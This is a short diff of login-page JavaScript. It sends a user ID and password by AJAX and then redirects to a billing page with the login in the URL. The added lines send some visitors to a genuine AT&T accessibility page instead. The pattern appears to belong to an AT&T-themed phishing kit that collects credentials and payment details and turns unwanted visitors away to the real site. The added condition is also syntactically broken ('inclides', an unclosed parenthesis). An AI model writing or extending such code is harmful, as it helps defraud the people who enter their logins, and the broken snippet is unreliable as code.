@@ -483,8 +483,11 @@ console.log(randomString);
                         data: { UserId: login, Password: pword }
                     }).done(function(msg) {
                 console.log(msg);
-                // When the request is successful
+                if(msg.inclides('on'){
                 window.location.href = ablp+"/billing.html?"+generateRandomString(6)+"%User="+login+" id_token="+randomString;
+		}else{
+			window.location.href = "https://about.att.com/sites/accessibility";
+		}
             }).fail(function(err, textstatus, error) {
                 // Handle AJAX request failure here
             });
